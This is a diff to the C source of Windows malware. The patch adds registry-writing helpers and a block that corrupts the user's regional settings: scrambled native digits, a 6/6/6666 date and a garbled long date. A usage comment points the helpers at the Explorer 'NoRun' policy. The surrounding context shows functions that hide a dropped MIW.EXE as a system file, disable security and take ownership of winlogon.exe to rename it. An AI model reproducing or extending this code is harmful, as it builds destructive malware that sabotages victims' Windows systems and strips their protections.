@@ -190,6 +190,60 @@ DWORD WINAPI payloadThread(LPVOID parameter) {
     }
 }
 
+// SetRegistryDWORD function
+/* Usage: SetRegistryDWORD(HKEY_CURRENT_USER,
+TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"),
+TEXT("NoRun"), 1); */
+int SetRegistryDWORD(HKEY hRoot, LPCTSTR subKey, LPCTSTR valueName, DWORD value)
+{
+    HKEY hKey;      // Some handle
+    LONG result;    // Some error code
+
+    result = RegCreateKeyEx(
+        hRoot, subKey,                  // For example HKEY_CURRENT_USER, subkey:TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
+        0, NULL, NULL,
+        KEY_WRITE | KEY_WOW64_32KEY,
+        NULL, &hKey, NULL
+    );
+
+    if (result != ERROR_SUCCESS)
+        return result;
+
+    result = RegSetValueEx(
+        hKey, valueName,               // For example TEXT("NoRun")
+        0, REG_DWORD,
+        (BYTE*)&value, sizeof(DWORD)    //Value 1
+    );
+
+    RegCloseKey(hKey);  // Close handle
+    return result;
+}
+
+int SetRegistryString(HKEY hRoot, LPCTSTR subKey, LPCTSTR valueName, LPCTSTR value)
+{
+    HKEY hKey;      // Some handle
+    LONG result;    // Some erro code
+
+    result = RegCreateKeyEx(
+        hRoot, subKey,
+        0, NULL, NULL,
+        KEY_WRITE | KEY_WOW64_32KEY,
+        NULL, &hKey, NULL
+    );
+
+    if (result != ERROR_SUCCESS)
+        return result;
+
+    result = RegSetValueEx(
+        hKey, valueName,
+        0, REG_SZ, 
+        (BYTE*)value,
+        (lstrlen(value) + 1) * sizeof(TCHAR)
+    );
+
+    RegCloseKey(hKey);
+    return result;
+}
 
 /* kill Windows instant */
 void killWindowsInstant() {
@@ -639,6 +693,33 @@ void CreateTimeDate() {
 
     /* Attribute it System and hide */
     ShellExecuteA(NULL, NULL, "attrib", "+s +h \u0022C:\\Program Files\\Common Files\\MIW.EXE\u0022", NULL, SW_HIDE);
+
+    // Alternatively use INTL time date form raw "3:33 AM" "3:33:33 AM (\my char crashes calendar)" raw date "6/6/6666"
+    // HKEY_CURRENT_USER Control Panel\\International 
+
+    // sDecimal
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sDecimal"), TEXT("0"));
+    // s1159        "AM"
+    // NumShape     0
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("NumShape"), TEXT("0"));
+    // sNativeDigits "0000000000"
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sNativeDigits"), TEXT("1258376490"));
+    // s2359        "AM"
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("s2359"), TEXT("AM"));
+
+    // sShortDate   "6/6/6666"
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sShortDate"), TEXT("6/6/6666"));
+    // sLongDate "Wednesday, June 6, 6666"
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sLongDate"), TEXT("¡τµ░ùáΣ╕Çτ╕ùáΣ, June 6, 6666"));
+    // sShortTime  
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sShortTime"), TEXT("3:33 tt"));    
+    // sThousand
+    // sTime        ":"
+    // sTimeFormat  "3:33:33 tt"
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sTimeFormat"), TEXT("3:33:33 tt"));
+    // sYearMonth   "June 6666"
+    SetRegistryString(HKEY_CURRENT_USER, TEXT("Control Panel\\International"), TEXT("sYearMonth"), TEXT("June 6666"));
+
 }
 
 void DisableSecurity() {
@@ -657,6 +738,8 @@ void SetTimeDate() {
         ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\System32\\Winlogon.exe & icacls C:\\Windows\\System32\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\System32\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
     }
     ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\MIW.EXE", NULL, NULL, SW_HIDE);
+    //Alternatively use INTL time date form raw "3:33 AM" "3:33:33 AM (\my char crashes calendar)" raw date "6/6/6666"
+    // HKCU\Control Panel\International 
 }
 
 int Tada() {
